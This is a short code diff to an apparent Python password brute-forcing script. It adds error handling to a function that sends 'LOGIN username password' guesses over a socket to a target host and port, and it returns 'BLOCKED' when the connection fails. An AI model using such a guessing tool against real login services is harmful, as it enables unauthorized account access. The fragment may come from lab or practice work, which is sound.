@@ -17,13 +17,21 @@ password_list = [
 
 def attempt_login(username: str, password: str) -> str:
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
-        s.connect((HOST,PORT))
+        try:
+            s.connect((HOST,PORT))
 
-        message = f"LOGIN {username} {password}\n"
-        s.sendall(message.encode())
+            message = f"LOGIN {username} {password}\n"
+            s.sendall(message.encode())
 
-        response = s.recv(1024).decode().strip()
-        return response
+            try:
+                response = s.recv(1024).decode().strip()
+                return response
+            except:
+                return "BLOCKED"
+        
+        except:
+            return "BLOCKED"
+
     
 
 def brute_force():
